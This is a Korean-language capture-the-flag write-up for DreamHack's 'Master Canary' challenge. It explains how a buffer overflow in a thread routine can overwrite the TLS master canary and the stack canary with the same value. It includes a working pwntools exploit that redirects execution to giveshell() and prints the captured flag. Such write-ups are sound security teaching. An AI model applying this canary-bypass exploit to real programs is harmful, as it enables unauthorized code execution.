# [DreamHack] Master Canary

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Master Canary에서 실습하는 문제입니다.
>
> Release: [Master Canary.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549980/Master.Canary.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161211538-cd41c230-171d-4769-848e-ab3313feae33.png)

## Analysis

```c
int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}
```

쓰레드를 생성하고, `thread_routine()`을 호출한다.

```c
int read_bytes (char *buf, int len) {
  int idx = 0;
  int read_len = 0;

  for (idx = 0; idx < len; idx++) {
    int ret;
    ret = read(0, buf+idx, 1);
    if (ret < 0) {
      return read_len; 
    }
    read_len ++;
  }

  return read_len;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  //read(0, buf, size);
  read_bytes(buf, size);
}
```

`thread_routine()`에서는 `buf`에 원하는 크기만큼 데이터를 입력할 수 있어 BOF가 발생한다. `thread_routine()`의 return address를 `giveshell()`로 덮기 위해서는 canary를 우회해야 한다.

![image](https://user-images.githubusercontent.com/102066383/161216266-b70c433c-3280-4ce0-b646-b91045368146.png)

생성된 쓰레드의 스택과 master canary는 같은 메모리 영역에 위치한다. 따라서 BOF를 이용하여 master canary를 원하는 값으로 변조할 수 있다. `thread_routine()`의 canary도 같은 값으로 덮어쓰면 canary 검사를 통과할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/mc_thread')
else:
    r = remote('host1.dreamhack.games', 17086)

giveshell = 0x400877  # giveshell()

payload = b'a' * 0x118  # dummy
payload += p64(giveshell)
payload = payload.ljust(0x950, b'a')

r.sendlineafter('Size: ', str(0x950))
r.sendafter('Data: ', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 17086: Done
[*] Switching to interactive mode
$ cat flag
DH{7a8a433f0b4738471fc40dca9d2d9831}
```